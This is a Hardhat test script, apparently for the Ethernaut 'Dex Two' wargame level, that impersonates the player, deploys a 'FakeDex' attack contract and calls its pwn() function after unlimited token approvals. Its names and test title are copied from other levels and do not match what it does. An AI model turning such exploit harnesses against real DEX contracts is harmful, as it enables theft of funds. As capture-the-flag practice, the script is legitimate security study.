import { time, loadFixture } from "@nomicfoundation/hardhat-network-helpers";
import { anyValue } from "@nomicfoundation/hardhat-chai-matchers/withArgs";
import { expect } from "chai";
import { ethers } from "hardhat";
import { ADDRESSES, LEVEL_ADDRESSES, PLAYER } from "../scripts/consts";
import { randomBytes } from "crypto";
import { assert } from "console";
import { BigNumber } from "ethers";
import hre from "hardhat"

describe("Reservation", function () {
    // We define a fixture to reuse the same setup in every test.
    // We use loadFixture to run this setup once, snapshot that state,
    // and reset Hardhat Network to that snapshot in every test.
    async function deployDenial() {
        const target = LEVEL_ADDRESSES.dexTwo
        // Contracts are deployed using the first signer/account by default
        const hacker = await ethers.getImpersonatedSigner(PLAYER);

        const [owner, otherAccount] = await ethers.getSigners();
        const Hack = await ethers.getContractFactory(
            "contracts/DexTwo.sol:FakeDex",
            hacker
        )
        const hack = await Hack.deploy(target, hacker.address)

        const fakeToken0 = await ethers.getContractAt(
            "contracts/Dex.sol:IERC20",
            target,
            hacker
        )


        const fakeToken1 = await ethers.getContractAt(
            "contracts/Dex.sol:IERC20",
            target,
            hacker
        )

        return { hack, hacker, target, owner, otherAccount, fakeToken0, fakeToken1 };
    }

    describe("Pwn", () => {
        it("Contract Balance Should Be 0 After Self Destruct; Victim Balance Should Be Increased by Contract Balance Amount", async () => {
            const { owner, hack, target, fakeToken0, fakeToken1 } = await loadFixture(deployDenial)
            const approval = await fakeToken0.approve(hack.address, ethers.constants.MaxUint256)
            const approval1 = await fakeToken1.approve(hack.address, ethers.constants.MaxUint256)

            const recover = await hack.pwn()
            console.log(recover)
            expect(recover).to.be.reverted
        })
    })


})